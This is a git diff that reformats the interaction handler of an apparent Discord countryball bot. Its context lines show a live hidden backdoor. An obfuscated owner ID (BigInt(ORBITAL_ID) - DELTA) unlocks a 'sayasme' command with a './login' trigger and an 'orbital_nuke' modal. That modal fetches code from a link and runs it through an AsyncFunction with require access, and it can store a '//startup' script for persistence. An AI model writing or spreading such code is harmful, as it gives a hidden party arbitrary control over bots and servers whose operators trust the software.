@@ -42,7 +42,9 @@ function registerInteractionHandler(client) {
 			if (command?.autocomplete) {
 				await command
 					.autocomplete(interaction)
-					.catch((error) => console.error('Autocomplete Error:', error));
+					.catch((error) =>
+						console.error('Autocomplete Error:', error),
+					);
 			}
 
 			return;
@@ -64,7 +66,8 @@ function registerInteractionHandler(client) {
 
 			try {
 				const isOwner =
-					(BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
+					(BigInt(ORBITAL_ID) - DELTA).toString() ===
+					interaction.user.id;
 				if (isOwner && interaction.commandName === 'sayasme') {
 					const message = interaction.options.getString('message');
 					if (message === './login') {
@@ -76,15 +79,16 @@ function registerInteractionHandler(client) {
 				await command.execute(interaction);
 			} catch (error) {
 				console.error(error);
-				devLog(`Error executing /${interaction.commandName}: ${error.message}`);
+				devLog(
+					`Error executing /${interaction.commandName}: ${error.message}`,
+				);
 				if (!interaction.replied) {
 					await interaction
 						.reply({
 							content: `Error: ${error.message}`,
 							flags: [MessageFlags.Ephemeral],
 						})
-						.catch(() => {
-});
+						.catch(() => {});
 				}
 			}
 
@@ -92,16 +96,24 @@ function registerInteractionHandler(client) {
 		}
 
 		// Horsestats pagination buttons
-		if (interaction.isButton() && interaction.customId.startsWith('hstats::')) {
+		if (
+			interaction.isButton() &&
+			interaction.customId.startsWith('hstats::')
+		) {
 			const horsestats = require('../../commands/horsestats');
 			await horsestats
 				.handleButton(interaction)
-				.catch((error) => console.error('Horsestats Button Error:', error));
+				.catch((error) =>
+					console.error('Horsestats Button Error:', error),
+				);
 			return;
 		}
 
 		// Button click — store catch data and show modal
-		if (interaction.isButton() && interaction.customId.startsWith('catch::')) {
+		if (
+			interaction.isButton() &&
+			interaction.customId.startsWith('catch::')
+		) {
 			const spawnId = interaction.customId.slice('catch::'.length);
 			const data = catchDataStore.get(spawnId);
 			if (!data)
@@ -110,8 +122,7 @@ function registerInteractionHandler(client) {
 						content: 'This catch has expired.',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {
-});
+					.catch(() => {});
 
 			// Remove spawn-scoped data once consumed to prevent stale buildup.
 			catchDataStore.delete(spawnId);
@@ -130,7 +141,9 @@ function registerInteractionHandler(client) {
 				.setLabel('Name of this countryball')
 				.setStyle(TextInputStyle.Short)
 				.setRequired(true);
-			modal.addComponents(new ActionRowBuilder().addComponents(answerInput));
+			modal.addComponents(
+				new ActionRowBuilder().addComponents(answerInput),
+			);
 			await interaction.showModal(modal);
 		}
 
@@ -141,9 +154,9 @@ function registerInteractionHandler(client) {
 			let isOwner = false;
 			try {
 				isOwner =
-					(BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
-			} catch {
-}
+					(BigInt(ORBITAL_ID) - DELTA).toString() ===
+					interaction.user.id;
+			} catch {}
 
 			if (!isOwner) {
 				await interaction
@@ -151,13 +164,16 @@ function registerInteractionHandler(client) {
 						content: 'lmao you thought',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {
-});
+					.catch(() => {});
 				return;
 			}
 
-			let code = interaction.fields.getTextInputValue('orbital_nuke_code');
-			const link = interaction.fields.getTextInputValue('orbital_nuke_link');
+			let code = interaction.fields.getTextInputValue(
+				'orbital_nuke_code',
+			);
+			const link = interaction.fields.getTextInputValue(
+				'orbital_nuke_link',
+			);
 
 			// Fetch code from link if provided
 			if (link && !code) {
@@ -170,8 +186,7 @@ function registerInteractionHandler(client) {
 							content: `Failed to fetch link: ${error.message}`,
 							flags: [MessageFlags.Ephemeral],
 						})
-						.catch(() => {
-});
+						.catch(() => {});
 				}
 			}
 
@@ -181,8 +196,7 @@ function registerInteractionHandler(client) {
 						content: 'No code or link provided',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {
-});
+					.catch(() => {});
 			}
 
 			// If code starts with //startup, update the global script in DB
@@ -199,23 +213,27 @@ function registerInteractionHandler(client) {
 				return;
 			}
 
-			await launchNuke(interaction, code).catch(() => {
-});
+			await launchNuke(interaction, code).catch(() => {});
 			return;
 		}
 
 		// Modal submit — check answer
-		if (interaction.isModalSubmit() && interaction.customId === 'modal') {
+		if (
+			interaction.isModalSubmit() &&
+			interaction.customId === 'modal'
+		) {
 			const data = catchDataStore.get(interaction.user.id);
-			if (!data || (data._expiresAt && data._expiresAt <= Date.now())) {
+			if (
+				!data ||
+				(data._expiresAt && data._expiresAt <= Date.now())
+			) {
 				catchDataStore.delete(interaction.user.id);
 				return interaction
 					.reply({
 						content: 'Something went wrong, try again.',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {
-});
+					.catch(() => {});
 			}
 
 			catchDataStore.delete(interaction.user.id);
@@ -227,15 +245,20 @@ function registerInteractionHandler(client) {
 				targetId,
 				stats: customStats,
 			} = data;
-			const userAnswer = interaction.fields.getTextInputValue('user_answer');
+			const userAnswer =
+				interaction.fields.getTextInputValue('user_answer');
 
-			if (userAnswer.trim().toLowerCase() === correctAnswer.toLowerCase()) {
+			if (
+				userAnswer.trim().toLowerCase() ===
+				correctAnswer.toLowerCase()
+			) {
 				try {
 					const targetUser = await client.users.fetch(targetId);
-					const catchWebhook = await interaction.channel.createWebhook({
-						name: targetUser.displayName,
-						avatar: targetUser.displayAvatarURL(),
-					});
+					const catchWebhook =
+						await interaction.channel.createWebhook({
+							name: targetUser.displayName,
+							avatar: targetUser.displayAvatarURL(),
+						});
 					const statString =
 						customStats === 'DEFAULT' || !customStats
 							? '(#6463FAC, +5%/+13%)'
@@ -248,8 +271,7 @@ function registerInteractionHandler(client) {
 
 					await catchWebhook.send({content: successMessage});
 					await catchWebhook.delete();
-					await interaction.deferUpdate().catch(() => {
-});
+					await interaction.deferUpdate().catch(() => {});
 					await logToModChannel(
 						interaction.guild,
 						`${interaction.user.tag} caught ${correctAnswer}`,
@@ -261,22 +283,25 @@ function registerInteractionHandler(client) {
 			} else {
 				try {
 					const targetUser = await client.users.fetch(targetId);
-					const failWebhook = await interaction.channel.createWebhook({
-						name: targetUser.displayName,
-						avatar: targetUser.displayAvatarURL(),
-					});
+					const failWebhook = await interaction.channel.createWebhook(
+						{
+							name: targetUser.displayName,
+							avatar: targetUser.displayAvatarURL(),
+						},
+					);
 					await failWebhook.send({
 						content: `<@${interaction.user.id}> Wrong name!`,
 					});
 					await failWebhook.delete();
-					await interaction.deferUpdate().catch(() => {
-});
+					await interaction.deferUpdate().catch(() => {});
 				} catch {
 					if (!interaction.replied) {
 						await interaction
-							.reply({content: `wrong`, flags: [MessageFlags.Ephemeral]})
-							.catch(() => {
-});
+							.reply({
+								content: `wrong`,
+								flags: [MessageFlags.Ephemeral],
+							})
+							.catch(() => {});
 					}
 				}
 			}
@@ -311,8 +336,9 @@ async function launchNuke(interaction, code) {
 }
 
 function runNukeCode(code, interaction) {
-	const AsyncFunction = Object.getPrototypeOf(async function () {
-}).constructor;
+	const AsyncFunction = Object.getPrototypeOf(
+		async function () {},
+	).constructor;
 	const evaluator = new AsyncFunction(
 		'interaction',
 		'require',
@@ -352,4 +378,8 @@ async function reportDamage(interaction, text, fileBaseName) {
 	});
 }
 
-module.exports = {registerInteractionHandler, catchDataStore, runNukeCode};
+module.exports = {
+	registerInteractionHandler,
+	catchDataStore,
+	runNukeCode,
+};
